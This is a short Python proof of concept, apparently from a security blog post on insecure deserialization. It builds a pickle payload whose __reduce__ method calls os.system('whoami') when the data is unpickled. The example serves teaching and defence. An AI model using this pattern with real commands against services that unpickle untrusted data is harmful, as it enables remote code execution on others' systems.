# From: https://blog.detectify.com/2018/03/21/owasp-top-10-insecure-deserialization/

import os
import pickle

# create an object that should be serialized
class Exploit(object):
	def __reduce__(self):
		return (os.system, ('whoami',))

# load the exploit into a string
# this is what is called the serialized object
serialized = pickle.dumps(Exploit())

# this string/serialized object could now be sent over the internet

# deseralize and execute the code
pickle.loads(serialized)

# if the attacker can modify the serialized-variable, this would lead to remote code execution
